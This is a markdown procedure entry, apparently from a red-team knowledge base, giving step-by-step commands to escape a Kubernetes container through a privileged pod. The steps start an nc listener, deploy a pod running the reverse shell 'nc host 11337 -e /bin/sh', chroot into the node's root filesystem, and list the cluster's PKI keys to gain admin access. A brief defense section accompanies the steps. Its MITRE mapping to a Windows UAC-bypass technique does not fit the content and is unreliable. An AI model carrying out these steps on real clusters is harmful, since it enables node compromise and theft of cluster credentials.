---
id: proc-008
tags:
  - escape
  - host
  - privilege-escalation
type: procedure
tools:
  - '[[tools/nc]]'
  - '[[tools/kubectl]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/nc-listen-for-reverse-shell]]'
  - '[[commands/kubectl-apply-escape-pod]]'
  - '[[commands/chroot-to-host-root]]'
  - '[[commands/ls-kubernetes-pki]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Bypass User Account Control]]'
updated_at: '2025-12-14T17:23:49.902Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Bypass User Account Control]]'
---
# Escape-to-Host-via-Privileged-Pod

## Summary

This procedure leverages the privileged SA kubeconfig to deploy an escape pod with host access, establishes a reverse shell, chroots to the host filesystem, and inspects Kubernetes PKI for further compromise.

## Description

Using the escalated SA (e.g., statefulset-controller with cluster-wide perms), create a pod with hostPID/hostNetwork/hostIPC, securityContext privileged=true, and volume mount of host root at /chroot. Exec or reverse shell to chroot, gaining node-level access to inspect /etc/kubernetes/pki for admin certs/keys.

## Requirements

1. sa.kubeconfig from previous procedure with sufficient perms.
2. escape_pod.yaml prepared with privileged settings.
3. nc listener on host port 11337.
4. Kind cluster with single node (control-plane).

## Defense

Defensive measures and detection strategies:

- Deny privileged pod creation via PodSecurityPolicies or Admission controllers.
- Use AppArmor/SELinux on nodes to restrict chroot.
- Monitor for host volume mounts in pod specs.
- Audit PKI directory access logs.

## Objectives

1. Deploy privileged escape pod.
2. Break out of container to host.
3. Access node filesystem and PKI.
4. Achieve full cluster admin via certs.

## Instructions

### Step 1: Start Reverse Shell Listener

**Context**: Listen for incoming connection from pod.

**Command** ([[commands/nc-listen-for-reverse-shell]]):

```bash
nc -kl 0.0.0.0 11337
```

> Expected output: "Listening on [0.0.0.0] (family 0, port 11337)".

### Step 2: Deploy Escape Pod

**Context**: Apply YAML with host mounts and privileged context; pod runs nc reverse shell.

**Command** ([[commands/kubectl-apply-escape-pod]]):

```bash
kubectl --kubeconfig sa.kubeconfig apply -f escape_pod.yaml
```

> Example YAML: Pod with initContainer mounting host / to /chroot, command nc host 11337 -e /bin/sh. Expected: Pod created/running.

### Step 3: Chroot to Host

**Context**: In the reverse shell or exec, change root to mounted host FS.

**Command** ([[commands/chroot-to-host-root]]):

```bash
chroot /chroot
```

> Expected output: New shell prompt on host root.

### Step 4: Inspect PKI

**Context**: List certs/keys for potential admin access.

**Command** ([[commands/ls-kubernetes-pki]]):

```bash
ls /etc/kubernetes/pki/
```

> Expected output: Files like ca.crt, apiserver.key, etc.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Bypass User Account Control]] Bypass User Account Control

### Sub-Techniques


## Commands Used

- [[commands/nc-listen-for-reverse-shell]]
- [[commands/kubectl-apply-escape-pod]]
- [[commands/chroot-to-host-root]]
- [[commands/ls-kubernetes-pki]]

## Tools Used

- [[tools/nc]]
- [[tools/kubectl]]

## Tags

- escape
- host
- privilege-escalation
